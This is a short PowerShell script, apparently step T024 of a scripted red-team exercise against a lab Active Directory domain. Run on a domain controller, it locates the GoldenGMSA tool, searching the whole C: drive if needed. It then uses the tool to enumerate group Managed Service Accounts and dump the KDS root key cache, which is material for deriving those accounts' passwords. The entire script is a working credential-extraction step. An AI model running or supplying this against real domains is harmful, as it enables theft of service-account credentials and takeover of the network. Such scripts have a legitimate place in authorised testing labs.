# T024 — gMSA extraction as cadre.local\chief_command on DC01
$ErrorActionPreference = 'Stop'
$tools = 'C:\Tools\cadre-attack'
$g = Join-Path $tools 'GoldenGMSA.exe'
if (-not (Test-Path $g)) {
  # Try to copy from ws01 staging location if absent
  $alt = Get-ChildItem 'C:\' -Recurse -Filter 'GoldenGMSA.exe' -ErrorAction SilentlyContinue | Select-Object -First 1
  if ($alt) { $g = $alt.FullName } else { throw 'GoldenGMSA.exe not found on DC01' }
}
Write-Output "GOLDENGMSA=$g"
Write-Output '=== gMSA enumeration ==='
& $g gmsainfo /domain:"cadre.local" /dc:"dc01.cadre.local"
Write-Output "RC=$LASTEXITCODE"
Write-Output '=== KDS root key cache ==='
& $g cache /domain:"cadre.local" /dc:"dc01.cadre.local"
Write-Output "RC2=$LASTEXITCODE"
Write-Output 'T024_DONE'
